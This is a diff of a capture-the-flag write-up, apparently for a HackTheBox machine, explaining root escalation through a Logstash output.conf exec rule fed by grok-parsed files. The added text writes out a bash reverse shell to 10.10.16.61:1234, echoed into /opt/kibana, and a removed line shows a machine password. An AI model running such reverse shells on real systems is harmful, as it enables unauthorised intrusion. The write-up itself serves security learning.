@@ -175,7 +175,11 @@ drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
 
 `conf.d` is the config directory of logstash consists of three files in genenal. Take a deep look into the directory, you'll a find an interesting thing. There is a command execute in output.conf. If you have basic knowledge of logstash, you should know the function of the three files. `input.conf` is used to config the data source. `filter.conf` is used to process the data, which  is usually combined with grok. `output.conf` is used to output the processed data. We can find there is a exec in the `output.conf`.
 
-So the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully.
+So the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully. The most important part is howw to create the content to be parsed to correct `comando`. So you should know how to use grok. Grok is utilized to recognize specific fields by regular expression. [Grok Debugger] is a useful tool to test grok online.
+
+![eyPIxg.png](https://s2.ax1x.com/2019/08/04/eyPIxg.png)
+
+Actually, the expression is quite simple. If you know regular expression, it will not be hard to understant the expression here.
 
 **filter.conf**
 
@@ -217,4 +221,12 @@ output {
 }
 ```
 
-pass: spanish.is.keyuser: security 
+Now, we have known how to create the corresponding `comando`. The next setp is to choose the command to execute. There is not nc in the machine. But there's python and perl in the machine. But the reverse shell command is a little long. So I choose to use `bash -i >& /dev/tcp/10.10.16.61/1234 0>&1`. Write the content to corresponding file:
+
+```
+echo "Ejecutar  comando: bash -i >& /dev/tcp/10.10.16.61/1234 0>&1" > /opt/kibana/logstash_1.txt
+```
+
+Use the nc to listen at port 1234, wait a while, root is coming.
+
+![eykUVs.png](https://s2.ax1x.com/2019/08/04/eykUVs.png)
